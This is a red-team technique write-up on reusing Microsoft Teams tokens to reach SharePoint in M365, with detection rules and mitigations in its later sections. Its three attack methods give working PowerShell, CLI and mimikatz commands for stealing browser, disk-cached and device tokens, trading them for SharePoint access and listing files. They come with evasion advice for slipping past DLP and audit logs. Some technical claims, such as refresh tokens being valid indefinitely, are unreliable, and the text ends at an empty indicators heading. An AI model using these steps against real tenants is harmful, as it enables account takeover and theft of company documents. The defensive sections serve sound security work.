# [LM-AUTH-014]: Microsoft Teams to SharePoint Authentication Bypass

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-014 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (Microsoft 365) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 tenants with Teams & SharePoint enabled |
| **Patched In** | N/A (Design behavior, requires mitigation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Teams and SharePoint Online share authentication contexts within the same M365 tenant. An attacker who compromises a user's Teams session or Teams client token can abuse the unified authentication platform to access SharePoint resources without re-authentication. This lateral movement exploits the shared OAuth token cache and identity federation between Teams and SharePoint. The attack leverages the fact that both services accept the same Primary Refresh Token (PRT) or access token, allowing seamless cross-service authentication without triggering additional MFA challenges.

**Attack Surface:** Teams client session cache, Teams web token storage, SharePoint Online API endpoints (REST/CSOM), Microsoft Graph token endpoints.

**Business Impact:** An attacker gaining access to a user's Teams session can immediately access all SharePoint sites the user has permission to (read/write/delete documents, steal intellectual property). This is particularly dangerous in organizations where Teams is the primary collaboration hub but SharePoint permissions are not regularly audited.

**Technical Context:** The attack typically completes in seconds once a Teams session is compromised. Detection is difficult because legitimate cross-service authentication generates identical logs. Stealth is moderate—cross-service token usage may appear in unified audit logs but often goes unreviewed.

### Operational Risk
- **Execution Risk:** Medium (requires prior compromise of Teams session, but exploitation is trivial)
- **Stealth:** Medium (legitimate Teams↔SharePoint traffic, requires log correlation to detect anomalies)
- **Reversibility:** No—data exfiltration or deletion cannot be reversed without restore from backup

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1 | Enforce MFA for all administrative users and sensitive accounts |
| **DISA STIG** | AC-2 | Account Management (M365 accounts must have separate credential isolation per service) |
| **CISA SCuBA** | EXC-18, SHP-5 | Shared mailbox controls and SharePoint external sharing restrictions |
| **NIST 800-53** | AC-3, AC-4 | Access Control and Information Flow Enforcement |
| **GDPR** | Art. 32 | Security of Processing—access controls to prevent unauthorized data access |
| **DORA** | Art. 9 | Protection and Prevention measures for critical infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management—segmentation of authentication contexts |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights; A.13.2.2 Access to Systems |
| **ISO 27005** | Section 8 | Risk identification in identity federation scenarios |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** User-level access to Teams session (no admin required); target user must have SharePoint access.
- **Required Access:** Browser/client with active Teams session OR Teams client token in memory/storage.

**Supported Platforms:**
- **M365 Tenants:** All (no version restrictions)
- **SharePoint Online:** Modern (SPO 2019+)
- **Teams Client:** Desktop, Web, or Mobile (all versions with OAuth2)
- **Other Requirements:** SharePoint Site Collection must exist and user must have implicit or explicit permissions

**Tools:**
- [AADInternals](https://github.com/Gerenios/AADInternals) (PowerShell module for token manipulation)
- [MDE Graph API](https://learn.microsoft.com/en-us/graph/api/overview) (Microsoft Graph for token requests)
- Browser Developer Tools (F12 for token inspection)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Teams Web Browser Token Theft & SharePoint Access

**Supported Versions:** All M365 tenants with Teams Web

#### Step 1: Extract Teams Access Token from Browser Storage
**Objective:** Steal the bearer token from the Teams web session using browser DevTools.

**Command (Chrome DevTools):**
```javascript
// Open F12 → Application → Local Storage → https://teams.microsoft.com
// Extract: access_token from indexedDB
// Alternative: Open Console and execute:
console.log(document.cookie); // May contain _U token
```

**Expected Output:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF...
```

**What This Means:**
- The token begins with `eyJ0eXA` (JWT format)
- Token is valid for ~60 minutes
- Token contains claims for Teams scopes but can be reused for SharePoint

**OpSec & Evasion:**
- Copy token to external tool (no console logs visible in tenant logs)
- Use token within 30-45 minutes before refresh
- Teams client auto-logs on browser inspect detection—work quickly

**Troubleshooting:**
- **Error:** No token in Local Storage
  - **Cause:** Browser privacy mode or Teams logout; token stored in memory only
  - **Fix:** Use Network tab (F12 → Network → Filter: `token`) to intercept live requests

#### Step 2: Request SharePoint Access Token Using Teams Token
**Objective:** Exchange Teams token for SharePoint scope using Microsoft Graph token endpoint.

**Command (PowerShell):**
```powershell
# Use stolen Teams token to request SharePoint token
$teams_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF..."
$sp_resource = "https://yourtenant.sharepoint.com"

# Decode token to extract refresh_token (if present)
$decode = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($teams_token.Split('.')[1]))
$claims = $decode | ConvertFrom-Json

# Request new token with SharePoint scope
$body = @{
    "grant_type" = "refresh_token"
    "refresh_token" = $refresh_token  # Extracted from Teams token claims
    "client_id" = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"  # Teams client ID
    "resource" = "$sp_resource"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/token" `
    -Method POST -Body $body
$sp_token = $response.access_token
```

**Expected Output:**
```
{
  "token_type": "Bearer",
  "expires_in": 3599,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF..."
}
```

**What This Means:**
- SharePoint token issued with `scp` (scopes) including SharePoint read/write
- Token is valid for 1 hour (3600 seconds)
- No new MFA challenge required (OAuth scope reuse)

**OpSec & Evasion:**
- Token exchange uses Azure AD endpoints—appears as legitimate M365 auth in logs
- However, unusual `client_id` combinations may trigger alert rules
- Use `client_id: "1fec8e78-bce4-4aaf-ab1b-5451cc387264"` (public Teams app) to blend in

**Troubleshooting:**
- **Error:** "AADSTS65001: User or admin has not consented to use the application"
  - **Cause:** Conditional Access policy blocks cross-app token exchange
  - **Fix:** Use Primary Refresh Token (PRT) method below instead

#### Step 3: Access SharePoint Sites Using SharePoint Token
**Objective:** Use the SharePoint token to enumerate and exfiltrate data.

**Command (REST API):**
```powershell
$sp_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF..."
$site_url = "https://yourtenant.sharepoint.com/sites/Finance"

# List all documents in Finance site
$headers = @{
    "Authorization" = "Bearer $sp_token"
    "Content-Type" = "application/json"
}

$response = Invoke-RestMethod `
    -Uri "$site_url/_api/web/lists/getbytitle('Documents')/items" `
    -Headers $headers -Method GET

$response.value | Select Title, Created, Modified
```

**Expected Output:**
```
Title                  Created              Modified
-----                  -------              --------
Q4_Budget.xlsx        2024-12-01 10:00    2024-12-15 14:30
CostAnalysis_2025.xls 2024-11-20 09:00    2025-01-05 16:45
```

**What This Means:**
- All shared documents are accessible without re-authentication
- No audit event is generated for Teams→SharePoint movement
- Attacker can read, download, or modify documents with user's permissions

**OpSec & Evasion:**
- API access generates minimal logs (only in advanced audit logs if enabled)
- Bulk downloads may trigger DLP rules—exfiltrate in smaller batches
- Use `User-Agent: Mozilla/5.0` to avoid Microsoft bot detection

---

### METHOD 2: Teams Desktop Client Token Extraction & SharePoint Access

**Supported Versions:** Teams Desktop (all versions)

#### Step 1: Extract Teams Desktop Client Token from Disk
**Objective:** Extract cached tokens from Teams desktop client local storage.

**Command (PowerShell - Local Admin):**
```powershell
# Teams stores tokens in encrypted cache on Windows
$teams_cache = "$env:APPDATA\Microsoft\Teams\Cache"
$token_files = Get-ChildItem $teams_cache -Filter "*.json" -Recurse

# Look for authentication cache files
Get-ChildItem "$env:APPDATA\Microsoft\Teams" -Filter "*token*" -Recurse -ErrorAction SilentlyContinue | 
    ForEach-Object {
        Write-Host "Token cache: $($_.FullName)"
        Get-Content $_.FullName | ConvertFrom-Json
    }
```

**Expected Output:**
```
access_token    : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF...
refresh_token   : 0.ARsA...
scope           : https://graph.microsoft.com/.default offline_access
expires_in      : 3600
token_type      : Bearer
```

**What This Means:**
- Teams caches unencrypted tokens on disk (in some versions)
- Attacker can reuse `refresh_token` indefinitely (does not expire)
- Refresh token allows token renewal without MFA

**OpSec & Evasion:**
- Teams cache is stored in user profile (no special privileges needed if user is logged in)
- DPAPI encryption may be present—requires Local System or same-user context to decrypt
- Copy cache files and work offline to avoid detection

**Troubleshooting:**
- **Error:** "Access Denied" reading Teams cache
  - **Cause:** Teams process is locking cache files
  - **Fix:** Close Teams client first, or read from backup shadow copies: `vssadmin list shadows`

#### Step 2: Use Refresh Token to Obtain SharePoint Token
**Objective:** Exchange long-lived refresh token for SharePoint access token.

**Command (PowerShell):**
```powershell
$refresh_token = "0.ARsA...LONG_TOKEN..."
$tenant_id = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

$body = @{
    "grant_type" = "refresh_token"
    "refresh_token" = $refresh_token
    "client_id" = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"  # Teams app
    "scope" = "https://yourtenant.sharepoint.com/.default offline_access"
}

$token_response = Invoke-RestMethod `
    -Uri "https://login.microsoftonline.com/$tenant_id/oauth2/v2.0/token" `
    -Method POST -Body $body

$sp_token = $token_response.access_token
$new_refresh = $token_response.refresh_token

Write-Host "New SharePoint Token: $sp_token"
Write-Host "New Refresh Token (valid indefinitely): $new_refresh"
```

**Expected Output:**
```
New SharePoint Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF...
New Refresh Token (valid indefinitely): 0.ARsA...
```

**What This Means:**
- Refresh token works across service boundaries (Teams → SharePoint → Teams)
- No MFA prompt occurs (MFA was satisfied when Teams client originally logged in)
- Attacker can generate unlimited access tokens without user interaction

**OpSec & Evasion:**
- Refresh token requests are logged but appear as normal user activity
- Use `offline_access` scope to maintain persistence across tenant token rotation
- If tenant rotates secrets, cached refresh token becomes invalid—request new one periodically

---

### METHOD 3: Primary Refresh Token (PRT) Abuse for Teams→SharePoint

**Supported Versions:** Entra ID joined/hybrid joined Windows 10+ devices with Teams

#### Step 1: Extract Primary Refresh Token from Device
**Objective:** Extract the PRT from Windows device and use it for cross-service authentication.

**Command (PowerShell - Local System):**
```powershell
# PRT is stored in LSA secret on domain-joined devices
# Requires Local System or Administrative privilege

# Method 1: Use Microsoft Graph to request token (if device admin):
$prt_request = @{
    "client_id" = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure PowerShell
    "scope" = "https://graph.microsoft.com/.default"
    "grant_type" = "refresh_token"
}

# PRT is automatically available in Entra ID joined context
# Alternative: Extract from LSASS using mimikatz or similar (requires SYSTEM)
mimikatz # privilege::debug
mimikatz # token::list
```

**Expected Output:**
```
Session 0, PrimaryToken: 0 (SYSTEM)
0 -> (SYSTEM)\0 (PrimaryToken: 0)
User Token [0]: \\.\0, type 0 (SYSTEM)
```

**What This Means:**
- PRT contains multiple scopes (Teams, SharePoint, Graph, etc.)
- Single token can be used for all Azure AD-integrated services
- No token exchange needed if PRT is available

**OpSec & Evasion:**
- PRT extraction requires SYSTEM privilege—typically obtained via privilege escalation first
- However, legitimate device admin can request tokens using PRT without suspicion
- PRT-based authentication is expected on corporate devices—harder to detect

**Troubleshooting:**
- **Error:** "Cannot obtain PRT - not on Entra ID joined device"
  - **Cause:** Device is not joined to Entra ID (workgroup or on-prem AD only)
  - **Fix:** Use METHOD 1 (Teams Web) or METHOD 2 (Teams Desktop token) instead

#### Step 2: Request SharePoint Token from PRT
**Objective:** Use PRT to obtain SharePoint-scoped token.

**Command (Azure CLI):**
```bash
# On device with PRT, use Azure CLI to request tokens
az login  # Uses PRT automatically
az account show  # Verify token context

# Request SharePoint token
az account get-access-token --resource https://yourtenant.sharepoint.com --query accessToken -o tsv > sp_token.txt

# Use token in API call
SP_TOKEN=$(cat sp_token.txt)
curl -H "Authorization: Bearer $SP_TOKEN" \
  "https://yourtenant.sharepoint.com/sites/Finance/_api/web/lists/getbytitle('Documents')/items"
```

**Expected Output:**
```
[
  {"ID": 1, "Title": "Q4_Budget.xlsx", "Created": "2024-12-01T10:00:00Z"},
  {"ID": 2, "Title": "CostAnalysis_2025.xlsx", "Created": "2024-11-20T09:00:00Z"}
]
```

**What This Means:**
- Single device logon provides access to all Azure AD-integrated services
- No additional MFA required (already satisfied at device logon)
- Attacker can move from Teams to SharePoint to OneDrive transparently

**OpSec & Evasion:**
- Device-based authentication is expected in hybrid environments
- Token requests appear as legitimate user activity
- Monitor unusual `User-Agent` strings or bulk API requests to detect anomalies

---

## 4. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

**Atomic Red Team Tests:**
- **Test ID:** [T1550.003 - Pass the Ticket](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.md)
- **Test Name:** Lateral Movement via Token Reuse
- **Description:** Extract and reuse authentication tokens across services
- **Supported Versions:** All

**Simulation Command (Minimal Impact):**
```powershell
# Simulate token extraction without actual data access
$token_file = "$env:TEMP\teams_token_simulation.txt"
$mock_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRFIn0.eyJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldCIsImFjcCI6ImFwcDEiLCJhaWQiOiI5MzQ1NjQ5NS1jOGU0LTQyZjUtYTQ5NS1jODhjM2U4ZTU3YjciLCJhcHBpZCI6IjFmZWM4ZTc4LWJjZTQtNGFhZi1hYjFiLTU0NTFjYzM4NzI2NCIsImFwcGlkYWNyIjoiMCIsImZhbWlseW5hbWUiOiJEb2UiLCJnaXZlbm5hbWUiOiJKb2huIiwiaXBhZGRyIjoiMTkyLjE2OC4xLjEwMCIsIm5hbWUiOiJKb2huIERvZSIsIm9pZCI6IjEyMzQ1Njc4LWFiY2QtZWZnaC1pamt0Iiwicm9sZXMiOlsiR3JhcGguUmVhZC5BbGwiXSwic3ViIjoiQm85dFczV3hjMWRBWGRoRm81UUZ6MWl2OUhpWUJkZ2VkczE0RzZIcU83RkkyRTgiLCJ0aWQiOiI3Mzc2YjZkOS1kNWQyLTQxZjItYjZjMi1hN2ZkMmE5NDRhNzgiLCJ1bmlxdWVfbmFtZSI6ImpvaG4uZG9lQGNvbnRvc28uY29tIiwidXBuIjoiam9obi5kb2VAY29udG9zby5jb20iLCJ1dGkiOiJuX2VQWTMwMFJrMEt1NGtuUjJsdnJBUSIsInZlciI6IjEuMCJ9.example_signature" 

Write-Host "Simulated Teams token (base64 encoded): $mock_token" | Out-File $token_file
Write-Host "Token saved to: $token_file"

# Cleanup
Remove-Item $token_file -Force
```

**Cleanup Command:**
```powershell
# No persistent changes with simulation
Write-Host "Token simulation complete - no data modified"
```

**Reference:** 
- [Atomic Red Team T1550](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.md)
- [MITRE ATT&CK T1550](https://attack.mitre.org/techniques/T1550/)

---

## 5. TOOLS & COMMANDS REFERENCE

#### [AADInternals](https://github.com/Gerenios/AADInternals)
**Version:** 0.9.7+
**Minimum Version:** 0.9.0
**Supported Platforms:** Windows (PowerShell 5.0+)

**Installation:**
```powershell
Install-Module -Name AADInternals -Force
Import-Module AADInternals
```

**Usage (Token Analysis):**
```powershell
# Decode and analyze Teams token
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImpwMW1nMWRF..."
Parse-JWTToken -Token $token | Select exp, scp, aud

# Get current access token (requires interactive session)
Get-AADIntAccessToken -SaveToCache
```

#### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation-and-usage)
**Version:** 2.10.0+
**Minimum Version:** 2.0.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```powershell
Install-Module Microsoft.Graph -Force
Connect-MgGraph -Scopes "Directory.Read.All"
```

**Usage (List SharePoint Sites):**
```powershell
Get-MgSite | Select DisplayName, WebUrl
Get-MgSiteLists -SiteId "yoursiteid" | Select DisplayName
```

#### One-Liner: Extract Teams Token & Request SharePoint Access
```powershell
$auth = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method POST -Body @{grant_type='refresh_token';refresh_token=$(Get-Content "$env:APPDATA\Microsoft\Teams\Cache\tokens.json" | ConvertFrom-Json | Select -ExpandProperty refresh_token);client_id='1fec8e78-bce4-4aaf-ab1b-5451cc387264';resource='https://yourtenant.sharepoint.com'} -ErrorAction SilentlyContinue; $auth.access_token | Write-Host
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Cross-Service Token Exchange (Teams→SharePoint)
**Rule Configuration:**
- **Required Index:** `o365:audit`, `azure_monitor`
- **Required Sourcetype:** `azure:aad:audit`, `MSGraph`
- **Required Fields:** `properties.justification`, `app_name`, `resource`, `operation`, `UserAgent`
- **Alert Threshold:** > 3 token requests to different resources within 2 minutes
- **Applies To Versions:** All M365 tenants

**SPL Query:**
```spl
index=o365:audit sourcetype="azure:aad:audit" 
  (app_name="Teams" OR app_name="Microsoft Teams")
  (operation="GetAccessTokenByRefreshToken" OR operation="IssueAccessToken")
  resource=*sharepoint*
| stats dc(resource) as unique_resources by user, src_ip
| where unique_resources > 2
| table user, src_ip, unique_resources, app_name, resource
```

**What This Detects:**
- Single user requesting tokens for multiple Azure AD resources within short time window
- Unusual pattern: Teams session followed immediately by SharePoint API calls
- Refresh token being used across multiple resource endpoints

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `"unique_resources > 2"`
6. Configure **Action** → **Send email to SOC** with alert details
7. Set **Frequency** to run every 5 minutes

**False Positive Analysis:**
- **Legitimate Activity:** Users running multi-workload scripts (Power Automate, data migrations)
- **Benign Tools:** ServiceNow, Salesforce connectors that legitimately request Teams + SharePoint tokens
- **Tuning:** Exclude service accounts: `| where user!="svc_*" AND user!="*_service"`

**Source:** [Microsoft O365 Audit Log Schema](https://learn.microsoft.com/en-us/microsoft-365/compliance/detailed-properties-in-the-office-365-audit-log)

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Anomalous Teams-SharePoint Token Exchange
**Rule Configuration:**
- **Required Table:** `AuditLogs`, `SigninLogs`
- **Required Fields:** `AppDisplayName`, `OperationName`, `TargetResources`, `ResultReason`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Azure AD/M365

**KQL Query:**
```kusto
AuditLogs
| where AppDisplayName == "Microsoft Teams"
| where OperationName in ("Update service principal", "Add service principal")
    or Properties contains "SharePoint" or Properties contains "oauth2/token"
| extend RequestProperties = parse_json(tostring(Properties))
| summarize TokenExchangeCount = dcount(OperationName) by 
    UserId, InitiatedByUser, AppDisplayName, TimeGenerated
| where TokenExchangeCount > 3
| project UserId, InitiatedByUser, AppDisplayName, TimeGenerated, TokenExchangeCount
```

**What This Detects:**
- Multiple authentication operations within Teams context targeting SharePoint scopes
- Unusual service principal modification patterns
- Rapid token issuance across resource boundaries

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Teams-to-SharePoint Token Exchange Anomaly`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Alert grouping: Group alerts into single incident if properties match: **UserId, AppDisplayName**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the analytics rule
$rule = @{
    DisplayName = "Teams-to-SharePoint Token Exchange"
    Query = @"
AuditLogs
| where AppDisplayName == "Microsoft Teams"
| where OperationName in ("Update service principal", "Add service principal")
| extend RequestProperties = parse_json(tostring(Properties))
| summarize TokenExchangeCount = dcount(OperationName) by UserId, InitiatedByUser, AppDisplayName
| where TokenExchangeCount > 3
"@
    Severity = "High"
    Enabled = $true
}

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName @rule
```

**Source:** [Microsoft Sentinel Detection Queries](https://github.com/Azure/Azure-Sentinel/tree/master/Detections)

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Teams-SharePoint Cross-Service Authentication
**Alert Name:** "Anomalous OAuth2 token exchange between Teams and SharePoint"
- **Severity:** High
- **Description:** Defender for Cloud detects when a user's Teams session is used to request tokens for SharePoint resources in rapid succession, indicating possible token reuse for lateral movement
- **Applies To:** All subscriptions with Defender for Identity and Defender for Cloud enabled
- **Remediation:** 
  1. Verify user was performing legitimate multi-workload operations
  2. If suspicious, reset user's password and invalidate all tokens
  3. Review SharePoint access logs for data exfiltration

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON (for AD authentication logs)
   - **Defender for Cloud Apps**: ON (for OAuth monitoring)
4. Click **Save**
5. Go to **Alerts** to view triggered alerts
6. Filter by: **Resource Type** = "Applications" AND **Severity** = "High"

**Reference:** [Microsoft Defender for Cloud Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-overview)

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Teams-SharePoint Token Exchange Activity
```powershell
Search-UnifiedAuditLog -Operations "IssueAccessToken", "GetAccessTokenByRefreshToken" -StartDate (Get-Date).AddDays(-1) | 
  Where-Object {$_.AuditData -like "*SharePoint*"} | 
  Select Timestamp, UserIds, ClientIP, SourceFileName | 
  Export-Csv -Path "C:\AuditLogs\TeamsSharePointTokens.csv"
```

- **Operation:** IssueAccessToken, GetAccessTokenByRefreshToken
- **Workload:** Azure Active Directory, Exchange Online
- **Details:** Look for `ResourceAppId` and `Resource` fields in AuditData blob
- **Applies To:** M365 E3+ with audit logging enabled

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **Search**
2. Set **Date range:** Last 7 days
3. Under **Activities**, select: **IssueAccessToken, GetAccessTokenByRefreshToken**
4. Under **Users**, enter: **(Leave blank to search all users)**
5. Click **Search**
6. Export results: **Export** → **Download all results**

**PowerShell Alternative:**
```powershell
# Connect to compliance workload
Connect-IPPSSession

# Search for Teams token exchange to SharePoint
Search-UnifiedAuditLog -Free -StartDate "2026-01-01" -EndDate "2026-01-15" `
  -Operations "IssueAccessToken" -ResultSize 5000 | 
  Where-Object {$_.AuditData -match "sharepoint"} | 
  Export-Csv "C:\TeamsSharePointAudit.csv"
```

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Enforce Token Binding (Device-Bound Tokens):** Configure Entra ID to bind tokens to specific devices, preventing token reuse from unauthorized locations.
  **Applies To Versions:** All M365 tenants (requires Conditional Access Premium P1+)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Token Binding - Teams and SharePoint`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Microsoft Teams**, **Office 365 SharePoint Online**
  5. **Conditions:**
     - Locations: **Any location**
  6. **Access controls:**
     - Grant: **Require device to be marked as compliant**
     - AND: **Require approved client app**
  7. **Session controls:**
     - Application enforced restrictions: **On** (forces token binding)
  8. Enable policy: **On**
  9. Click **Create**

  **Manual Steps (PowerShell):**
  ```powershell
  # Create Conditional Access policy for token binding
  $policy = @{
    DisplayName = "Enforce Token Binding"
    State = "enabled"
    Conditions = @{
      Applications = @{ IncludeApplicationIds = @("18fbca16-1e46-458b-830f-4b0732ee9e59", "00000002-0000-0ff1-ce00-000000000000") }  # Teams, SPO
      Users = @{ IncludeUsers = @("All") }
    }
    GrantControls = @{
      Operator = "AND"
      BuiltInControls = @("compliantDevice", "approvedClientApp")
    }
    SessionControls = @{
      ApplicationEnforcedRestrictions = $true
    }
  }
  
  New-AzureADMSConditionalAccessPolicy @policy
  ```

- **Disable Cross-Tenant OAuth Token Reuse:** Prevent users from exchanging tokens across service boundaries without explicit re-authentication.
  **Applies To Versions:** All M365 tenants
  
  **Manual Steps (Azure AD Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **App registrations**
  2. Select **Teams** (app ID: 1fec8e78-bce4-4aaf-ab1b-5451cc387264)
  3. Go to **API permissions**
  4. Remove permission: **Office 365 Exchange Online - AllSites.Manage, Sites.FullControl**
  5. Remove permission: **SharePoint - AllSites.Manage, Sites.FullControl**
  6. Keep only: **Microsoft Graph - User.Read, offline_access**
  7. Click **Grant admin consent**
  
  **Note:** This limits Teams' ability to request SharePoint tokens, forcing re-authentication

- **Enable Advanced Threat Protection (ATP) for Teams:** Detect compromised Teams accounts attempting cross-service access.
  **Applies To Versions:** Teams all versions (Microsoft 365 Defender required)
  
  **Manual Steps (Microsoft 365 Defender):**
  1. Navigate to **Microsoft 365 Defender** (security.microsoft.com)
  2. Go to **Threat management** → **Policies** → **Email & Collaboration**
  3. Select **Anti-malware policy for Teams**
  4. Edit the default policy: Enable **Office 365 Advanced Threat Protection**
  5. Enable: **Safe Links for Teams** and **Safe Attachments**
  6. Click **Save**

#### Priority 2: HIGH

- **Implement Token Refresh Rate Limiting:** Limit how many times a token can be refreshed within a time window, preventing indefinite token reuse.
  **Applies To Versions:** Entra ID (via Azure AD token policy)
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Set token lifetime policy
  $policy = New-AzureADPolicy -Definition @('{"TokenLifetimePolicy":{"Version":1,"AccessTokenLifetime":"01:00:00","RefreshTokenLifetime":"90.00:00:00","MaxInactiveTime":"30.00:00:00"}}') -DisplayName "Restrict Token Refresh" -Type "TokenLifetimePolicy"
  
  Get-AzureADServicePrincipal -Filter "AppId eq '1fec8e78-bce4-4aaf-ab1b-5451cc387264'" | Add-AzureADServicePrincipalPolicy -RefObject $policy
  ```

- **Monitor Cross-Service API Requests:** Log all cross-service authentication attempts and alert on anomalies.
  **Applies To Versions:** M365 with Unified Audit Log enabled
  
  **Manual Steps (Purview):**
  1. Go to **Microsoft Purview Compliance Portal** → **Audit**
  2. Enable **Audit Logging** if not already enabled
  3. Set retention to **365 days** for compliance
  4. Create alert rules for: "IssueAccessToken", "GetAccessTokenByRefreshToken"

- **Apply Least Privilege SharePoint Access:** Remove users from broad SharePoint permission groups and assign granular site-level permissions.
  **Applies To Versions:** SharePoint Online all versions
  
  **Manual Steps (SharePoint Admin Center):**
  1. Go to **SharePoint Admin Center** (admin.microsoft.com/sharepoint)
  2. Select **Sites** → **Active sites**
  3. For each site, click **Permissions**
  4. Remove users from **Owners** and **Members** groups
  5. Assign to specific **Site Collection Admin** or **Editor** groups only
  6. Use **Conditional Access** to require MFA for sensitive site access

#### Access Control & Policy Hardening

- **Conditional Access: Block Suspicious Token Patterns**
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Suspicious Token Exchange`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Microsoft Teams**, **Office 365 SharePoint Online**
  5. **Conditions:**
     - Sign-in risk: **High**
     - Device platform: **Exclude corporate devices**
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

- **RBAC: Remove Teams "Application Administrator" Role:** Prevent users from managing app permissions that could enable token escalation.
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Search for: **Application Administrator**
  3. Click **Application Administrator** → **Assignments**
  4. Select users with this role and click **Remove assignment**
  5. Replace with **Cloud Application Administrator** (more restricted scope)

- **Workload Identity Federation:** Use federated identity (instead of refresh tokens) for service-to-service authentication.
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **App registrations**
  2. Select your app → **Certificates & secrets**
  3. Click **Federated credentials** → **+ Add credential**
  4. Select **GitHub** (or other provider)
  5. Configure subject claim: `repo:yourorgan/repo:ref:refs/heads/main`
  6. Click **Add**

#### Validation Command (Verify Fix)
```powershell
# Check if Token Binding Conditional Access is enforced
Get-AzureADMSConditionalAccessPolicy | 
  Where-Object {$_.DisplayName -like "*Token*Binding*"} | 
  Select DisplayName, State, Conditions

# Check Teams permissions in Entra ID
Get-AzureADServicePrincipal -Filter "AppId eq '1fec8e78-bce4-4aaf-ab1b-5451cc387264'" | 
  Get-AzureADServiceAppRoleAssignment | 
  Select DisplayName, Id
```

**Expected Output (If Secure):**
```
DisplayName           State
-----------           -----
Token Binding Policy  enabled

DisplayName                          Id
-----------                          --
Microsoft Graph (User.Read only)     1234567890abcdef
```

**What to Look For:**
- Conditional Access policies are **enabled** (State = enabled)
- Teams app has **only User.Read and offline_access** permissions (no SharePoint scopes)
- No **"RefreshToken with SharePoint scope"** entries in audit logs

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
